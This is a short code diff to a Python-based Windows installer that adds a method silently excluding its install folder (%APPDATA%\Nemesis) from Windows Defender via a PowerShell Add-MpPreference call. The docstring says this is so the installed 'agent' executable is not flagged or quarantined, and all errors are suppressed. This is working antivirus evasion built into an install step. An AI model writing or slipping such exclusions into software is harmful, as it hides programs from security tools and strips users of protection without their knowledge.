@@ -119,6 +119,19 @@ class InstallerApp:
     # ── install steps (Windows) ──────────────────────────────────────────────
     def _check_requirements(self):
         os.makedirs(INSTALL_DIR, exist_ok=True)
+        self._add_defender_exclusion()
+
+    def _add_defender_exclusion(self):
+        """Phase 3: exclude the install dir from Windows Defender so the agent exe
+        isn't flagged/quarantined. Best-effort (needs admin — Setup runs elevated)."""
+        import subprocess
+        try:
+            subprocess.run(
+                ["powershell", "-NoProfile", "-Command",
+                 f"Add-MpPreference -ExclusionPath '{INSTALL_DIR}'"],
+                check=False, capture_output=True, timeout=30)
+        except Exception:
+            pass
 
     def _install_files(self):
         """Copy the FROZEN agent exe into %APPDATA%\\Nemesis (no Python needed on the
